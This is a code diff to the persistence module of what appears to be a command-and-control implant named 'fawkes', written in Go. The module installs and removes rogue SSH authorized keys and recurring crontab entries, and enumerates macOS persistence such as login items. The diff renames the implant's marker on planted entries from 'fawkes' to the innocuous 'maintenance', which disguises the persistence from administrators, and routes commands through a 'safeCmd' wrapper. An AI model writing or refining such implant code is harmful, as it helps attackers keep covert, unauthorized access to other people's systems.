@@ -6,7 +6,6 @@ package commands
 import (
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
 
@@ -27,10 +26,10 @@ func persistSSHKey(args persistArgs) structs.CommandResult {
 
 func persistSSHKeyInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (SSH public key string) is required")
+		return errorResult("path (SSH public key string) is required")
 	}
 
-	marker := "fawkes"
+	marker := "maintenance"
 	if args.Name != "" {
 		marker = args.Name
 	}
@@ -61,7 +60,7 @@ func persistSSHKeyInstall(args persistArgs) structs.CommandResult {
 }
 
 func persistSSHKeyRemove(args persistArgs) structs.CommandResult {
-	marker := "fawkes"
+	marker := "maintenance"
 	if args.Name != "" {
 		marker = args.Name
 	}
@@ -109,20 +108,20 @@ func persistCrontab(args persistArgs) structs.CommandResult {
 
 func persistCrontabInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (executable to persist) is required")
+		return errorResult("path (executable to persist) is required")
 	}
 	if args.Schedule == "" {
 		args.Schedule = "*/5 * * * *"
 	}
 
-	marker := "fawkes"
+	marker := "maintenance"
 	if args.Name != "" {
 		marker = args.Name
 	}
 	cronLine := fmt.Sprintf("%s %s # %s", args.Schedule, args.Path, marker)
 
 	var currentCrontab string
-	cmd := exec.Command("crontab", "-l")
+	cmd := safeCmd("crontab", "-l")
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		currentCrontab = ""
@@ -140,7 +139,7 @@ func persistCrontabInstall(args persistArgs) structs.CommandResult {
 	}
 	newCrontab += cronLine + "\n"
 
-	installCmd := exec.Command("crontab", "-")
+	installCmd := safeCmd("crontab", "-")
 	installCmd.Stdin = strings.NewReader(newCrontab)
 	if out, err := installCmd.CombinedOutput(); err != nil {
 		return errorf("Failed to install crontab: %v\n%s", err, string(out))
@@ -150,12 +149,12 @@ func persistCrontabInstall(args persistArgs) structs.CommandResult {
 }
 
 func persistCrontabRemove(args persistArgs) structs.CommandResult {
-	marker := "fawkes"
+	marker := "maintenance"
 	if args.Name != "" {
 		marker = args.Name
 	}
 
-	cmd := exec.Command("crontab", "-l")
+	cmd := safeCmd("crontab", "-l")
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		return errorResult("No crontab entries found")
@@ -176,7 +175,7 @@ func persistCrontabRemove(args persistArgs) structs.CommandResult {
 		return errorf("No crontab entries found with marker '%s'", marker)
 	}
 
-	installCmd := exec.Command("crontab", "-")
+	installCmd := safeCmd("crontab", "-")
 	installCmd.Stdin = strings.NewReader(strings.Join(filtered, "\n"))
 	if out, err := installCmd.CombinedOutput(); err != nil {
 		return errorf("Failed to update crontab: %v\n%s", err, string(out))
@@ -219,7 +218,7 @@ func persistDarwinList() structs.CommandResult {
 
 	// Crontab
 	sb.WriteString("\n[Crontab]\n")
-	cmd := exec.Command("crontab", "-l")
+	cmd := safeCmd("crontab", "-l")
 	if output, err := cmd.CombinedOutput(); err == nil {
 		lines := strings.Split(string(output), "\n")
 		for _, line := range lines {
@@ -307,7 +306,7 @@ func persistDarwinList() structs.CommandResult {
 	// Login Items
 	sb.WriteString("\n[Login Items]\n")
 	listScript := `tell application "System Events" to get {name, path} of every login item`
-	if out, err := exec.Command("osascript", "-e", listScript).CombinedOutput(); err == nil {
+	if out, err := safeCmd("osascript", "-e", listScript).CombinedOutput(); err == nil {
 		result := strings.TrimSpace(string(out))
 		if result != "" && result != ", " {
 			sb.WriteString(fmt.Sprintf("  %s\n", result))
